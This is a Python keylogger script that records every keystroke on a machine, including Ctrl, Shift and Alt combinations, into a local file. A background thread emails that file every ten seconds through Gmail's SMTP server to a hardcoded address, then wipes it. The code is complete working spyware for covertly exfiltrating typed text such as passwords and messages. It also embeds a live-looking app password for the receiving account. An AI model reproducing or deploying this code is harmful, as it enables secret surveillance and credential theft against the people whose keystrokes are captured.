import threading
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from pynput.keyboard import Key, Listener
import logging
import time

# Define the location of the keylog
keylogger_filename = r"keylogger.txt"
# Define the format of the keylog
logging.basicConfig(filename=keylogger_filename, level=logging.DEBUG, format="%(message)s")

# Track the state of modifier keys
modifier_keys = {
    Key.ctrl_l: False,
    Key.ctrl_r: False,
    Key.shift: False,
    Key.shift_r: False,
    Key.alt: False
}

# Generate control character mappings (Ctrl + A to Ctrl + Z)
control_character_map = {chr(i): f"{chr(i + 64)}" for i in range(1, 27)}

# Function to interpret hexadecimal keys used in combination with the Ctrl key
def interpret_control_key(key):
    """Convert a control character to a readable format if it's in the control character map."""
    if hasattr(key, 'char') and key.char in control_character_map:
        return control_character_map[key.char]
    return str(key)

# Process the key on press
def on_press(key):
    if key == Key.esc:
        return False
    # Detect if it's a modifier key and update its state
    if key in modifier_keys:
        modifier_keys[key] = True
    else:
        # Check for active modifiers
        active_modifiers = [str(k) for k, v in modifier_keys.items() if v]
        
        if active_modifiers:
            # Interpret control key combinations
            key_str = interpret_control_key(key)
            combination = " + ".join(active_modifiers) + " + " + str(key_str).strip("'")
            print(f"Combination pressed: {combination}")
            logging.info(combination)
        else:
            # Determine the key representation
            if hasattr(key, 'char') and key.char is not None:
                key_str = key.char  # Get the character directly
            else:
                key_str = str(key)  # For special keys (e.g., Key.enter, Key.shift, etc.)

            print("Single key pressed: " + key_str)
            logging.info(key_str)

# Release modifier keys on release
def on_release(key):
    # Reset the specific modifier state when it’s released
    if key in modifier_keys:
        modifier_keys[key] = False

# Function to send keylogger.txt as an attachment in an email
def send_email(sender_email, recipient_email, subject, smtp_server, smtp_port, login, password):
    try:
        # Set up the email
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = subject

        # Read the contents of the text file and attach it as the email body
        with open("./keylogger.txt", 'r') as file:
            body = file.read()
        message.attach(MIMEText(body, 'plain'))

        # Open the keylogger.txt file in binary mode to attach it
        with open('./keylogger.txt', 'rb') as attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(attachment.read())  # Read the file
            encoders.encode_base64(part)  # Encode the attachment in base64

            # Add the header to specify the attachment filename
            part.add_header('Content-Disposition', 'attachment', filename='keylogger.txt')
            message.attach(part)  # Attach the file to the message

        # Connect to the SMTP server
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()  # Upgrade the connection to secure
            server.login(login, password)  # Log in to the server
            server.send_message(message)  # Send the email
            print("Email sent successfully.")

    except Exception as e:
        print(f"An error occurred while sending the email: {e}")

# Function to periodically send emails
def periodic_email():
    sender_email = "ptandjiria@gmail.com"
    recipient_email = "ptandjiria@gmail.com"
    subject = "Keylog Report"
    body = ""
    smtp_server = "smtp.gmail.com"
    smtp_port = 587
    login = "ptandjiria@gmail.com"
    password = "ovhi hysp vsfb lvxi"  # I used Google app passwords to bypass the two-factor authentication. This is not my actual password and can't be used to sign into my account.

    while True:
        send_email(sender_email, recipient_email, subject, smtp_server, smtp_port, login, password)
        # Clear the contents of keylogger.txt
        with open("keylogger.txt", "w"):
            pass
        time.sleep(10)  # Sleep for 10 seconds before sending the next email

# Start the periodic email thread, which will exit when the program exits
email_thread = threading.Thread(target=periodic_email)
email_thread.daemon = True
email_thread.start()

# Listen for keyboard events and call on_press/on_release whenever a key is pressed/released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join() 
